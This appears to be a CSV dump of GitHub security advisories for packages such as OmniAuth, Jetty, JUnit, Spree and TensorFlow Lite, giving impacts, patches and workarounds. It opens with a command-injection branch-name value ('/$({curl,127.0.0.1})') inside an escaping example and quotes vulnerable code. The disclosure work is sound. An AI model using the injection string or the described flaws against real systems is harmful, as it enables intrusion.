### Workarounds
Escape the branch name prior to passing it to the `Dependabot::Source` class.

For example using `shellwords`:

```ruby
require ""shellwords""
branch = Shellwords.escape(""/$({curl,127.0.0.1})"")
source = Dependabot::Source.new(
  provider: ""github"",
  repo: ""repo/name"",
  directory: ""/"",
  branch: branch,
)
```",rubygems
600,18914,omniauth,GHSA-ww4x-rwq6-qpgf,CVE-2015-9284,https://github.com/advisories/GHSA-ww4x-rwq6-qpgf,high,2019-05-29 19:11:31 UTC,Cross-site Request Forgery in OmniAuth,"The request phase of the OmniAuth Ruby gem (1.9.1 and earlier) is vulnerable to Cross-Site Request Forgery when used as part of the Ruby on Rails framework, allowing accounts to be connected without user intent, user interaction, or feedback to the user. This permits a secondary account to be able to sign into the web application as the primary account.

As of v2 OmniAuth no longer has the vulnerable configuration by default, but it is still possible to configure OmniAuth in such a way that the web application becomes vulnerable to Cross-Site Request Forgery. There is a recommended remediation described [here](https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284).",rubygems
601,34081,org.apache.poi:poi,GHSA-523c-xh4g-mh5m,CVE-2017-12626,https://github.com/advisories/GHSA-523c-xh4g-mh5m,high,2021-01-14 19:18:22 UTC,Denial of Service in Apache POI,"Apache POI in versions prior to release 3.17 are vulnerable to Denial of Service Attacks:
  - Infinite Loops while parsing crafted WMF, EMF, MSG and macros (POI bugs 61338 and 61294)
  - Out of Memory Exceptions while parsing crafted DOC, PPT and XLS (POI bugs 52372 and 61295)",maven
602,33995,org.eclipse.jetty:jetty-webapp,GHSA-g3wg-6mcf-8jj6,CVE-2020-27216,https://github.com/advisories/GHSA-g3wg-6mcf-8jj6,high,2020-11-04 17:50:24 UTC,Local Temp Directory Hijacking Vulnerability,"### Impact
On Unix like systems, the system's temporary directory is shared between all users on that system.  A collocated user can observe the process of creating a temporary sub directory in the shared temporary directory and race to complete the creation of the temporary subdirectory.  If the attacker wins the race then they will have read and write permission to the subdirectory used to unpack web applications, including their WEB-INF/lib jar files and JSP files.  If any code is ever executed out of this temporary directory, this can lead to a local privilege escalation vulnerability.

Additionally, any user code uses of [WebAppContext::getTempDirectory](https://www.eclipse.org/jetty/javadoc/9.4.31.v20200723/org/eclipse/jetty/webapp/WebAppContext.html#getTempDirectory()) would similarly be vulnerable.

Additionally, any user application code using the `ServletContext` attribute for the tempdir will also be impacted.
See: https://javaee.github.io/javaee-spec/javadocs/javax/servlet/ServletContext.html#TEMPDIR

For example:
```java
import java.io.File;
import java.io.IOException;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ExampleServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        File tempDir = (File)getServletContext().getAttribute(ServletContext.TEMPDIR); // Potentially compromised
        // do something with that temp dir
    }
}
```

Example: The JSP library itself will use the container temp directory for compiling the JSP source into Java classes before executing them.

### CVSSv3.1 Evaluation

This vulnerability has been calculated to have a [CVSSv3.1 score of 7.8/10 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H&version=3.1)

### Patches
Fixes were applied to the 9.4.x branch with:
- https://github.com/eclipse/jetty.project/commit/53e0e0e9b25a6309bf24ee3b10984f4145701edb
- https://github.com/eclipse/jetty.project/commit/9ad6beb80543b392c91653f6bfce233fc75b9d5f

These will be included in releases: 9.4.33, 10.0.0.beta3, 11.0.0.beta3

### Workarounds

A work around is to set a temporary directory, either for the server or the context, to a directory outside of the shared temporary file system.
For recent releases, a temporary directory can be created simple by creating a directory called `work` in the ${jetty.base} directory (the parent directory of the `webapps` directory).
Alternately the java temporary directory can be set with the System Property `java.io.tmpdir`.    A more detailed description of how jetty selects a temporary directory is below.

The Jetty search order for finding a temporary directory is as follows:

1. If the [`WebAppContext` has a temp directory specified](https://www.eclipse.org/jetty/javadoc/current/org/eclipse/jetty/webapp/WebAppContext.html#setTempDirectory(java.io.File)), use it.
2. If the `ServletContext` has the `javax.servlet.context.tempdir` attribute set, and if directory exists, use it.
3. If a `${jetty.base}/work` directory exists, use it (since Jetty 9.1)
4. If a `ServletContext` has the `org.eclipse.jetty.webapp.basetempdir` attribute set, and if the directory exists, use it.
5. Use `System.getProperty(""java.io.tmpdir"")` and use it.

Jetty will end traversal at the first successful step.
To mitigate this vulnerability the directory must be set to one that is not writable by an attacker.  To avoid information leakage, the directory should also not be readable by an attacker.

#### Setting a Jetty server temporary directory.

Choices 3 and 5 apply to the server level, and will impact all deployed webapps on the server.

For choice 3  just create that work directory underneath your `${jetty.base}` and restart Jetty.

For choice 5, just specify your own `java.io.tmpdir` when you start the JVM for Jetty.

``` shell
[jetty-distribution]$ java -Djava.io.tmpdir=/var/web/work -jar start.jar
```

#### Setting a Context specific temporary directory.

The rest of the choices require you to configure the context for that deployed webapp (seen as `${jetty.base}/webapps/<context>.xml`)

Example (excluding the DTD which is version specific):

``` xml
<Configure class=""org.eclipse.jetty.webapp.WebAppContext"">
  <Set name=""contextPath""><Property name=""foo""/></Set>
  <Set name=""war"">/var/web/webapps/foo.war</Set>
  <Set name=""tempDirectory"">/var/web/work/foo</Set>
</Configure>
```

### References
 
 - https://github.com/eclipse/jetty.project/issues/5451
 - [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
 - [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https://cwe.mitre.org/data/definitions/379.html)
 - [CodeQL Query PR To Detect Similar Vulnerabilities](https://github.com/github/codeql/pull/4473)

### Similar Vulnerabilities

Similar, but not the same.

 - JUnit 4 - https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp
 - Google Guava - https://github.com/google/guava/issues/4011
 - Apache Ant - https://nvd.nist.gov/vuln/detail/CVE-2020-1945
 - JetBrains Kotlin Compiler - https://nvd.nist.gov/vuln/detail/CVE-2020-15824

### For more information

The original report of this vulnerability is below:

> On Thu, 15 Oct 2020 at 21:14, Jonathan Leitschuh <jonathan.leitschuh@gmail.com> wrote:
> Hi WebTide Security Team,
>
> I'm a security researcher writing some custom CodeQL queries to find Local Temporary Directory Hijacking Vulnerabilities. One of my queries flagged an issue in Jetty.
>
> https://lgtm.com/query/5615014766184643449/
>
> I've recently been looking into security vulnerabilities involving the temporary directory because on unix-like systems, the system temporary directory is shared between all users.
> There exists a race condition between the deletion of the temporary file and the creation of the directory.
>
> ```java
> // ensure file will always be unique by appending random digits
> tmpDir = File.createTempFile(temp, "".dir"", parent); // Attacker knows the full path of the file that will be generated
> // delete the file that was created
> tmpDir.delete(); // Attacker sees file is deleted and begins a race to create their own directory before Jetty.
> // and make a directory of the same name
> // SECURITY VULNERABILITY: Race Condition! - Attacker beats Jetty and now owns this directory
> tmpDir.mkdirs();
> ```
>
> https://github.com/eclipse/jetty.project/blob/1b59672b7f668b8a421690154b98b4b2b03f254b/jetty-webapp/src/main/java/org/eclipse/jetty/webapp/WebInfConfiguration.java#L511-L518
>
> In several cases the `parent` parameter will not be the system temporary directory. However, there is one case where it will be, as the last fallback.
>
>
> https://github.com/eclipse/jetty.project/blob/1b59672b7f668b8a421690154b98b4b2b03f254b/jetty-webapp/src/main/java/org/eclipse/jetty/webapp/WebInfConfiguration.java#L467-L468
>
> If any code is ever executed out of this temporary directory, this can lead to a local privilege escalation vulnerability.
>
> Would your team be willing to open a GitHub security advisory to continue the discussion and disclosure there? https://github.com/eclipse/jetty.project/security/advisories
>
> **This vulnerability disclosure follows Google's [90-day vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (I'm not an employee of Google, I just like their policy). Full disclosure will occur either at the end of the 90-day deadline or whenever a patch is made widely available, whichever occurs first.**
>
> Cheers,
> Jonathan Leitschuh


",maven
603,19850,cryptography,GHSA-hggm-jpg3-v476,CVE-2020-25659,https://github.com/advisories/GHSA-hggm-jpg3-v476,moderate,2020-10-27 20:33:13 UTC,RSA decryption vulnerable to Bleichenbacher timing vulnerability,"RSA decryption was vulnerable to Bleichenbacher timing vulnerabilities, which would impact people using RSA decryption in online scenarios. This is fixed in cryptography 3.2. ",pip
604,14817,CefSharp.Common,GHSA-pv36-h7jh-qm62,CVE-2020-15999,https://github.com/advisories/GHSA-pv36-h7jh-qm62,moderate,2020-10-27 19:47:38 UTC,Heap buffer overflow in CefSharp,"### Impact
A memory corruption bug(Heap overflow) in the FreeType font rendering library.

> This can be exploited by attackers to execute arbitrary code by using specially crafted fonts with embedded PNG images .

As per https://www.secpod.com/blog/chrome-zero-day-under-active-exploitation-patch-now/ 

Google is aware of reports that an exploit for CVE-2020-15999 exists in the wild.

### Patches
Upgrade to 85.3.130 or higher

### References
- https://www.secpod.com/blog/chrome-zero-day-under-active-exploitation-patch-now/
- https://www.zdnet.com/article/google-releases-chrome-security-update-to-patch-actively-exploited-zero-day/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15999
- https://magpcss.org/ceforum/viewtopic.php?f=10&t=17942

To review the `CEF/Chromium` patch see https://bitbucket.org/chromiumembedded/cef/commits/cd6cbe008b127990036945fb75e7c2c1594ab10d",nuget
605,27395,spree,GHSA-f8cm-364f-q9qh,CVE-2020-15269,https://github.com/advisories/GHSA-f8cm-364f-q9qh,high,2020-10-20 20:03:52 UTC,Ensure that doorkeeper_token is valid when authenticating requests in API v2 calls,"### Impact
The perpetrator who previously obtained an old expired user token could use it to access Storefront API v2 endpoints. 

### Patches
Please upgrade to 3.7.11, 4.0.4, or 4.1.11 depending on your used Spree version. 

### Workarounds
In your project directory create a decorator file `app/controllers/spree/api/v2/base_controller_decotatror.rb` with contents:

```ruby
module Spree
  module Api
    module V2
      module BaseControllerDecorator
        private

        def spree_current_user
          return nil unless doorkeeper_token
          return @spree_current_user if @spree_current_user

          doorkeeper_authorize!

          @spree_current_user ||= ::Spree.user_class.find_by(id: doorkeeper_token.resource_owner_id)
        end
     end
  end
end

Spree::Api::V2::BaseController.prepend(Spree::Api::V2::BaseControllerDecorator)
```

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@spreecommerce.org](mailto:security@spreecommerce.org)",rubygems
606,17303,object-path,GHSA-cwx2-736x-mf6w,CVE-2020-15256,https://github.com/advisories/GHSA-cwx2-736x-mf6w,high,2020-10-19 20:55:55 UTC,Prototype pollution in object-path,"### Impact
A prototype pollution vulnerability has been found in `object-path` <= 0.11.4 affecting the `set()` method. The vulnerability is limited to the `includeInheritedProps` mode (if version >= 0.11.0 is used), which has to be explicitly enabled by creating a new instance of `object-path` and setting the option `includeInheritedProps: true`, or by using the default `withInheritedProps` instance. The default operating mode is not affected by the vulnerability if version >= 0.11.0 is used. Any usage of `set()` in versions < 0.11.0 is vulnerable.
 
### Patches
Upgrade to version >= 0.11.5

### Workarounds
Don't use the `includeInheritedProps: true` options or the `withInheritedProps` instance if using a version >= 0.11.0.

### References
[Read more about the prototype pollution vulnerability](https://codeburst.io/what-is-prototype-pollution-49482fc4b638)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [object-path](https://github.com/mariocasciaro/object-path)",npm
607,33869,junit:junit,GHSA-269g-pwp5-87pp,CVE-2020-15250,https://github.com/advisories/GHSA-269g-pwp5-87pp,moderate,2020-10-12 17:33:00 UTC,TemporaryFolder on unix-like systems does not limit access to created files,"### Vulnerability

The JUnit4 test rule [TemporaryFolder](https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html) contains a local information disclosure vulnerability.

Example of vulnerable code:
```java
public static class HasTempFolder {
    @Rule
    public TemporaryFolder folder = new TemporaryFolder();

    @Test
    public void testUsingTempFolder() throws IOException {
        folder.getRoot(); // Previous file permissions: `drwxr-xr-x`; After fix:`drwx------`
        File createdFile= folder.newFile(""myfile.txt""); // unchanged/irrelevant file permissions
        File createdFolder= folder.newFolder(""subfolder""); // unchanged/irrelevant file permissions
        // ...
    }
}
```

### Impact

On Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system.

This vulnerability **does not** allow other users to overwrite the contents of these directories or files. This is purely an information disclosure vulnerability.

When analyzing the impact of this vulnerability, here are the important questions to ask:

1. Do the JUnit tests write sensitive information, like API keys or passwords, into the temporary folder?
    - If yes, this vulnerability impacts you, but only if you also answer 'yes' to question 2.
    - If no, this vulnerability does not impact you.
2. Do the JUnit tests ever execute in an environment where the OS has other untrusted users. 
    _This may apply in CI/CD environments but normally won't be 'yes' for personal developer machines._
    - If yes, and you answered 'yes' to question 1, this vulnerability impacts you.
    - If no, this vulnerability does not impact you.

### Patches

Because certain JDK file system APIs were only added in JDK 1.7, this this fix is dependent upon the version of the JDK you are using.
 - Java 1.7 and higher users: this vulnerability is fixed in 4.13.1.
 - Java 1.6 and lower users: **no patch is available, you must use the workaround below.**

### Workarounds

If you are unable to patch, or are stuck running on Java 1.6, specifying the `java.io.tmpdir` system environment variable to a directory that is exclusively owned by the executing user will fix this vulnerability.

### References
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- Fix commit https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae

#### Similar Vulnerabilities
 - Google Guava - https://github.com/google/guava/issues/4011
 - Apache Ant - https://nvd.nist.gov/vuln/detail/CVE-2020-1945
 - JetBrains Kotlin Compiler - https://nvd.nist.gov/vuln/detail/CVE-2020-15824

### For more information
If you have any questions or comments about this advisory, please pen an issue in [junit-team/junit4](https://github.com/junit-team/junit4/issues).",maven
608,17359,jison,GHSA-vr9x-mm65-2438,CVE-2020-8178,https://github.com/advisories/GHSA-vr9x-mm65-2438,high,2020-10-08 21:38:51 UTC,Command Injection in jison,"**Withdrawn:** This vulnerability is not present in the released npm package.  Rather the vulnerable code is
part of the repo, but not part of the package. See linked hackerone report for more details.

Insufficient input validation in npm package `jison` <= 0.4.18 may lead to OS command injection attacks.",npm
609,16863,next,GHSA-x56p-c8cg-q435,CVE-2020-15242,https://github.com/advisories/GHSA-x56p-c8cg-q435,moderate,2020-10-08 19:28:07 UTC,Open Redirect in Next.js versions,"### Impact

- **Affected**: Users of Next.js between 9.5.0 and 9.5.3 
- **Not affected**: Deployments on Vercel ([https://vercel.com](https://vercel.com)) are not affected
- **Not affected**: Deployments using `next export`

We recommend everyone to upgrade regardless of whether you can reproduce the issue or not.

### Patches

https://github.com/vercel/next.js/releases/tag/v9.5.4

### References

https://github.com/vercel/next.js/releases/tag/v9.5.4

",npm
610,34999,org.apache.axis:axis,GHSA-55w9-c3g2-4rrh,CVE-2012-5784,https://github.com/advisories/GHSA-55w9-c3g2-4rrh,moderate,2020-10-07 17:51:02 UTC,Man-in-the-middle attack in Apache Axis,"Apache Axis 1.4 and earlier, as used in PayPal Payments Pro, PayPal Mass Pay, PayPal Transactional Information SOAP, the Java Message Service implementation in Apache ActiveMQ, and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",maven
611,34999,org.apache.axis:axis,GHSA-r53v-vm87-f72c,CVE-2014-3596,https://github.com/advisories/GHSA-r53v-vm87-f72c,moderate,2018-10-16 20:50:58 UTC,Moderate severity vulnerability that affects org.apache.axis:axis,"The getCN function in Apache Axis 1.4 and earlier does not properly verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a certificate with a subject that specifies a common name in a field that is not the CN field.  NOTE: this issue exists because of an incomplete fix for CVE-2012-5784.",maven
612,34999,org.apache.axis:axis,GHSA-96jq-75wh-2658,CVE-2018-8032,https://github.com/advisories/GHSA-96jq-75wh-2658,moderate,2018-10-16 20:51:15 UTC,Moderate severity vulnerability that affects apache axis,Apache Axis 1.x up to and including 1.4 is vulnerable to a cross-site scripting (XSS) attack in the default servlet/services.,maven
613,16343,electron,GHSA-56pc-6jqp-xqj8,CVE-2020-15215,https://github.com/advisories/GHSA-56pc-6jqp-xqj8,low,2020-10-06 17:46:40 UTC,Context isolation bypass in Electron,"### Impact
Apps using both `contextIsolation` and `sandbox: true` are affected.
Apps using both `contextIsolation` and `nativeWindowOpen: true` are affected.

This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

### Workarounds
There are no app-side workarounds, you must update your Electron version to be protected.

### Fixed Versions
* `11.0.0-beta.6`
* `10.1.2`
* `9.3.1`
* `8.5.2`

### For more information
If you have any questions or comments about this advisory:
* Email us at [security@electronjs.org](mailto:security@electronjs.org)",npm
614,33906,org.springframework:spring-core,GHSA-ffvq-7w96-97p7,CVE-2018-15756,https://github.com/advisories/GHSA-ffvq-7w96-97p7,high,2020-06-15 19:34:50 UTC,Denial of Service in Spring Framework,"Spring Framework, version 5.1, versions 5.0.x prior to 5.0.10, versions 4.3.x prior to 4.3.20, and older unsupported versions on the 4.2.x branch provide support for range requests when serving static resources through the ResourceHttpRequestHandler, or starting in 5.0 when an annotated controller returns an org.springframework.core.io.Resource. A malicious user (or attacker) can add a range header with a high number of ranges, or with wide ranges that overlap, or both, for a denial of service attack. This vulnerability affects applications that depend on either spring-webmvc or spring-webflux. Such applications must also have a registration for serving static resources (e.g. JS, CSS, images, and others), or have an annotated controller that returns an org.springframework.core.io.Resource. Spring Boot applications that depend on spring-boot-starter-web or spring-boot-starter-webflux are ready to serve static resources out of the box and are therefore vulnerable.",maven
615,16343,electron,GHSA-2q4g-w47c-4674,CVE-2020-15174,https://github.com/advisories/GHSA-2q4g-w47c-4674,high,2020-10-06 14:24:04 UTC,Unpreventable top-level navigation,"### Impact
The `will-navigate` event that apps use to prevent navigations to unexpected destinations [as per our security recommendations](https://www.electronjs.org/docs/tutorial/security) can be bypassed when a sub-frame performs a top-frame navigation across sites.

### Patches

* `11.0.0-beta.1`
* `10.0.1`
* `9.3.0`
* `8.5.1`

### Workarounds
Sandbox all your iframes using the [`sandbox` attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox).  This will prevent them creating top-frame navigations and is good practice anyway.

### For more information
If you have any questions or comments about this advisory:

* Email us at security@electronjs.org",npm
616,19793,shrine,GHSA-5jjv-x4fq-qjwp,CVE-2020-15237,https://github.com/advisories/GHSA-5jjv-x4fq-qjwp,moderate,2020-10-05 15:48:34 UTC,Possible timing attack in derivation_endpoint,"### Impact

When using the `derivation_endpoint` plugin, it's possible for the attacker to use a timing attack to guess the signature of the derivation URL.

### Patches

The problem has been fixed by comparing sent and calculated signature in constant time, using `Rack::Utils.secure_compare`. Users using the `derivation_endpoint` plugin are urged to upgrade to Shrine 3.3.0 or greater.

### Workarounds

Users of older Shrine versions can apply the following monkey-patch after loading the `derivation_endpoint` plugin:

```rb
class Shrine
  class UrlSigner
    def verify_signature(string, signature)
      if signature.nil?
        fail InvalidSignature, ""missing \""signature\"" param""
      elsif !Rack::Utils.secure_compare(signature, generate_signature(string))
        fail InvalidSignature, ""provided signature does not match the calculated signature""
      end
    end
  end
end
```

### References

You can read more about timing attacks [here](https://en.wikipedia.org/wiki/Timing_attack).",rubygems
617,20741,tensorflow,GHSA-hx2x-85gr-wrpq,CVE-2020-15212,https://github.com/advisories/GHSA-hx2x-85gr-wrpq,high,2020-09-25 18:29:00 UTC,Out of bounds access in tensorflow-lite,"### Impact
In TensorFlow Lite models using segment sum can trigger writes outside of bounds of heap allocated buffers by inserting negative elements in the segment ids tensor:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reference_ops.h#L2625-L2631

Users having access to `segment_ids_data` can alter `output_index` and then write to outside of `output_data` buffer.

This might result in a segmentation fault but it can also be used to further corrupt the memory and can be chained with other vulnerabilities to create more advanced exploits.

### Patches
We have patched the issue in 204945b and will release patch releases for all affected versions.

We recommend users to upgrade to TensorFlow 2.2.1, or 2.3.1.

### Workarounds
A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that the segment ids are all positive, although this only handles the case when the segment ids are stored statically in the model.

A similar validation could be done if the segment ids are generated at runtime between inference steps.

If the segment ids are generated as outputs of a tensor during inference steps, then there are no possible workaround and users are advised to upgrade to patched code.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been discovered from a variant analysis of [GHSA-p2cq-cprg-frvm](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2cq-cprg-frvm).",pip
618,20741,tensorflow,GHSA-p2cq-cprg-frvm,CVE-2020-15214,https://github.com/advisories/GHSA-p2cq-cprg-frvm,high,2020-09-25 18:28:56 UTC,Out of bounds write in tensorflow-lite,"### Impact
In TensorFlow Lite models using segment sum can trigger a write out bounds / segmentation fault if the segment ids are not sorted. Code assumes that the segment ids are in increasing order, using the last element of the tensor holding them to determine the dimensionality of output tensor:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/segment_sum.cc#L39-L44

This results in allocating insufficient memory for the output tensor and in a write outside the bounds of the output array:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reference_ops.h#L2625-L2631

This usually results in a segmentation fault, but depending on runtime conditions it can provide for a write gadget to be used in future memory corruption-based exploits.

### Patches
We have patched the issue in 204945b and will release patch releases for all affected versions.

We recommend users to upgrade to TensorFlow 2.2.1, or 2.3.1.

### Workarounds
A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that the segment ids are sorted, although this only handles the case when the segment ids are stored statically in the model.

A similar validation could be done if the segment ids are generated at runtime between inference steps.

If the segment ids are generated as outputs of a tensor during inference steps, then there are no possible workaround and users are advised to upgrade to patched code.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
619,20741,tensorflow,GHSA-hjmq-236j-8m87,CVE-2020-15213,https://github.com/advisories/GHSA-hjmq-236j-8m87,moderate,2020-09-25 18:28:53 UTC,Denial of service in tensorflow-lite,"### Impact
In TensorFlow Lite models using segment sum can trigger a denial of service by causing an out of memory allocation in the implementation of segment sum. Since code uses the last element of the tensor holding them to determine the dimensionality of output tensor, attackers can use a very large value to trigger a large allocation:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/segment_sum.cc#L39-L44

### Patches
We have patched the issue in 204945b and will release patch releases for all affected versions.

We recommend users to upgrade to TensorFlow 2.2.1, or 2.3.1.

### Workarounds
A potential workaround would be to add a custom `Verifier` to limit the maximum value in the segment ids tensor. This only handles the case when the segment ids are stored statically in the model, but a similar validation could be done if the segment ids are generated at runtime, between inference steps.

However, if the segment ids are generated as outputs of a tensor during inference steps, then there are no possible workaround and users are advised to upgrade to patched code.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been discovered from a variant analysis of [GHSA-p2cq-cprg-frvm](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2cq-cprg-frvm).",pip
620,20741,tensorflow,GHSA-x9j7-x98r-r4w2,CVE-2020-15210,https://github.com/advisories/GHSA-x9j7-x98r-r4w2,moderate,2020-09-25 18:28:51 UTC,Segmentation fault in tensorflow-lite,"### Impact
If a TFLite saved model uses the same tensor as both input and output of an operator, then, depending on the operator, we can observe a segmentation fault or just memory corruption.

### Patches
We have patched the issue in d58c96946b and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### Workarounds
A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that no operator reuses tensors as both inputs and outputs. Care should be taken to check all types of inputs (i.e., constant or variable tensors as well as optional tensors).

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been discovered from a variant analysis of [GHSA-cvpc-8phh-8f45](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvpc-8phh-8f45).",pip
621,20741,tensorflow,GHSA-cvpc-8phh-8f45,CVE-2020-15211,https://github.com/advisories/GHSA-cvpc-8phh-8f45,moderate,2020-09-25 18:28:49 UTC,Out of bounds access in tensorflow-lite,"### Impact
In TensorFlow Lite, saved models in the flatbuffer format use a double indexing scheme: a model has a set of subgraphs, each subgraph has a set of operators and each operator has a set of input/output tensors. The flatbuffer format uses indices for the tensors, indexing into an array of tensors that is owned by the subgraph. This results in a pattern of double array indexing when trying to get the data of each tensor:https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/kernel_util.cc#L36

However, some operators can have some tensors be optional. To handle this scenario, the flatbuffer model uses a negative `-1` value as index for these tensors:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/c/common.h#L82

This results in special casing during validation at model loading time: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L566-L580

Unfortunately, this means that the `-1` index is a valid tensor index for any operator, including those that don't expect optional inputs and including for output tensors. Thus, this allows writing and reading from outside the bounds of heap allocated arrays, although only at a specific offset from the start of these arrays.

This results in both read and write gadgets, albeit very limited in scope.

### Patches
We have patched the issue in several commits (46d5b0852, 00302787b7, e11f5558, cd31fd0ce, 1970c21, and fff2c83). We will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### Workarounds
A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that only operators which accept optional inputs use the `-1` special value and only for the tensors that they expect to be optional. Since this allow-list type approach is erro-prone, we advise upgrading to the patched code.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
622,20741,tensorflow,GHSA-qh32-6jjc-qprm,CVE-2020-15209,https://github.com/advisories/GHSA-qh32-6jjc-qprm,moderate,2020-09-25 18:28:46 UTC,Null pointer dereference in tensorflow-lite,"### Impact
A crafted TFLite model can force a node to have as input a tensor backed by a `nullptr` buffer. This can be achieved by changing a buffer index in the flatbuffer serialization to convert a read-only tensor to a read-write one. The runtime assumes that these buffers are written to before a possible read, hence they are initialized with `nullptr`:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L1224-L1227

However, by changing the buffer index for a tensor and implicitly converting that tensor to be a read-write one, as there is nothing in the model that writes to it, we get a null pointer dereference.

### Patches
We have patched the issue in 0b5662bc and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360 but was also discovered through variant analysis of [GHSA-cvpc-8phh-8f45](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvpc-8phh-8f45).",pip
623,20741,tensorflow,GHSA-mxjj-953w-2c2v,CVE-2020-15208,https://github.com/advisories/GHSA-mxjj-953w-2c2v,high,2020-09-25 18:28:44 UTC,Data corruption in tensorflow-lite,"### Impact
When determining the common dimension size of two tensors, TFLite uses a `DCHECK` which is no-op outside of debug compilation modes:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/types.h#L437-L442

Since the function always returns the dimension of the first tensor, malicious attackers can craft cases where this is larger than that of the second tensor. In turn, this would result in reads/writes outside of bounds since the interpreter will wrongly assume that there is enough data in both tensors.

### Patches
We have patched the issue in 8ee24e7949a20 and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
624,20741,tensorflow,GHSA-q4qf-3fc6-8x34,CVE-2020-15207,https://github.com/advisories/GHSA-q4qf-3fc6-8x34,high,2020-09-25 18:28:43 UTC,Segfault and data corruption in tensorflow-lite,"### Impact
To mimic Python's indexing with negative values, TFLite uses `ResolveAxis` to convert negative values to positive indices. However, the only check that the converted index is now valid is only present in debug builds:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reduce.h#L68-L72

If the `DCHECK` does not trigger, then code execution moves ahead with a negative index. This, in turn, results in accessing data out of bounds which results in segfaults and/or data corruption.
### Patches
We have patched the issue in 2d88f470dea2671b430884260f3626b1fe99830a and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
